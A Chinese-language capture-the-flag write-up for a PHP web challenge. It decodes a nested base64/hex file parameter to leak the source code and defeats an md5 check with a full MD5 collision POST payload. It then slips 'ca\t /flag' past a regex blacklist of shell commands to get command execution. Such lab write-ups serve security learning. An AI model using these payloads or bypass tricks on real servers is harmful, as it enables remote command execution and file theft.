![[Pasted image 20221118110609.png]]

---
首页长这样

![[Pasted image 20221118110637.png]]

自动跳转到了这个url
```php
/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```

---
`img`参数的值可能经过了`base64`编码

![[Pasted image 20221118112321.png]]

![[Pasted image 20221118112331.png]]

似乎还是套娃编码

---
首页提示`md5 is funny ~`，就这么被带偏了，以为最后这串是md5，结果想解密提示格式都不对，绕了好久才发现这原来是个简单的16进制编码

![[Pasted image 20221118112610.png]]

---
搞懂了`img`参数的编码，尝试逆用这一点获取`index.php`的文件内容
```php
/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=
```

![[Pasted image 20221118112846.png]]
```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
```

---
ctf3.jpeg（~~充满恶意~~嘲讽拉满）

![[Pasted image 20221118113435.png]]

---
![[Pasted image 20221118190742.png]]

如上，由于对`POST`参数进行了向`string`类型的强制类型转换，而`php`默认行为并非对数组及其各个元素进行向字符串的转换，而是直接返回`'Array'`，因此第一个比较的结果便为假，削减了利用数组绕过`md5`的可行性

这里的`md5`需要通过强碰撞绕过

~~在网上找现成的强碰撞`payload`找了半天呜呜呜~~

```php
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

这里还踩了一个坑，就是`POST`要加一个`Content-Type`头，并将值设为`application/x-www-form-urlencoded`，告诉服务器这段`POST`数据已经`url`编码过了

---
然后是`cmd`参数的构造，这个题的绕过还是比较氵的
```php
cmd=ca\t /flag
```
原理大致就是，对于`preg_match`来说，`\t`被转义成了横向制表符，因而没有被过滤；而对于`sh`来说，`\t`被解析为`t`，因此`payload`依然被作为`cat /flag`执行

#Web #md5 #PHP #绕过 #shell #编码 